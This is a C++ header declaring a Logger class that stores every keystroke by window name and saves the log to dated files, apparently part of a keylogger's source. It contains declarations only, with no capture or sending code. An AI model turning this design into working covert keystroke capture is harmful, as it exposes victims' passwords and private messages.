#pragma once

#include "Utilities.h"
#include "Keys.h"
#include <fstream>
#include <sstream>
#include <map>  

class Logger
{
	// Hold the log of every pressed keys for every window
	map<string, string> Log;

	// Hold path name where to save log
	string Date;

	// Hold the keys map used to write down keys to log
	Keys Keys;

	// Insert(string, string) : Insert into map the key stroke on the window
	void Insert(string window_name, string key_input);

	// Insert(string, int) : Insert into map the key stroke on the window
	void Insert(string window_name, int key_input);

public:

	// Logger() : Constructor of the Logger class
	Logger();

	// Add(string, int) : Add key stroke and the window name to Logger
	void Add(string window_name, int key_stroke);

	// UpdateLog() : Update the log date and save and clean log when date change
	void UpdateLog();

	// GetLog(string) : Return the key log for a specific window
	string GetLog(string window_name);

	// GetLog(string) : Return all the key log for all window
	string GetLog();

	// GetDate() : Return the the log date
	string GetDate() const;

	// SetDate(string) :  Set the dare of the log
	void SetDate(string date);

	// SaveMapToFile() : Save Map content to file
	void SaveMapToFile();

	// LoadMapFromFile() : Load file content to map
	bool LoadMapFromFile();
};